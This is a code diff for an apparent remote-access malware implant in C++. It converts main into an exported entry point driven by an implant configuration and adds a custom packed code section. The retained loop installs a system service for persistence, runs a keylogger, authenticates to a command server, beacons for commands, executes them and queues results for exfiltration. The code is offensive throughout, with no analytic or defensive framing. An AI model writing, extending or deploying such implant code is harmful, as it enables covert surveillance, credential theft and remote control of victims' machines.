@@ -1,20 +1,31 @@
+#include "../BeaconLoop.hpp"
+#include "../CommandDispatcher.hpp"
+#include "../Installer.hpp"
+#include "../Payloads.hpp"
+#include "../SessionManager.hpp"
+#include "ExfilEnvelope.hpp"
+#include "Types.hpp"
+#include "Util/SafeLogger.hpp"
+
 #include <HttpUtils.hpp>
 #include <RESTClient.hpp>
 #include <cpppwn.hpp>
 #include <filesystem>
 #include <print>
 
-#include "BeaconLoop.hpp"
-#include "CommandDispatcher.hpp"
-#include "Config.hpp"
-#include "ExfilEnvelope.hpp"
-#include "Installer.hpp"
-#include "Payloads.hpp"
-#include "SessionManager.hpp"
-#include "Types.hpp"
-#include "Util/SafeLogger.hpp"
+#include <ImplantConfig.hpp>
 
-int main(int argc, char* argv[]) {
+#if defined(MALVEX_PACKED)
+#define MX_TEXT_SECTION __attribute__((section(".mx_text"), used))
+#else
+#define MX_TEXT_SECTION
+#endif
+
+extern "C" MX_TEXT_SECTION int mx_main(int argc, char** argv, const ImplantConfig* cfg) {
+    if (cfg == nullptr) {
+        return 1;
+    }
+
     bool is_installation = false;
     Keylogger keylogger;
     SessionManager sessionMan;
@@ -28,7 +39,7 @@ int main(int argc, char* argv[]) {
     }
 
     if (is_installation) {
-        if (installSystemService(config.service_name, config.service_desc)) {
+        if (installSystemService(cfg->service_name, cfg->service_desc)) {
             return 0;
         }
         return 1;
@@ -37,10 +48,10 @@ int main(int argc, char* argv[]) {
     logger::debug("Starting main logic of the implant...");
 
     const auto& browser_config = HttpConfig(BrowserType::Firefox);
-    cpppwn::RESTClient rest_client(config.server_url, browser_config);
-    rest_client.set_auth_basic(config.username, config.password);
+    cpppwn::RESTClient rest_client(cfg->server_url, browser_config);
+    rest_client.set_auth_basic(cfg->username, cfg->password);
 
-    const auto default_sleep = std::atol(config.default_timeout);
+    const auto default_sleep = std::atol(cfg->default_timeout);
     int current_sleep = static_cast<int>(default_sleep);
     std::atomic<bool> running{true};
 
@@ -49,8 +60,8 @@ int main(int argc, char* argv[]) {
         keylogger,
         sessionMan,
         running,
-        config.username,
-        config.password);
+        cfg->username,
+        cfg->password);
 
     while (running) {
         const std::vector<CommandDAO> command_list = beacon_state.send_beacon(rest_client);
@@ -58,7 +69,11 @@ int main(int argc, char* argv[]) {
         logger::debug("UUID: {} | Count of Commands: {}", get_or_create_implant_id(), command_list.size());
 
         for (const auto& cmd : command_list) {
-            logger::debug("Executing Command:\n- UUID: {}\n- CLIENT: {}\n- COMMAND: {}", cmd.uid, cmd.client, cmd.command);
+            logger::debug(
+                "Executing Command:\n- UUID: {}\n- CLIENT: {}\n- COMMAND: {}",
+                cmd.uid,
+                cmd.client,
+                cmd.command);
 
             auto results = dispatcher.dispatch(cmd);
             beacon_state.enqueue_chunks(std::move(results));
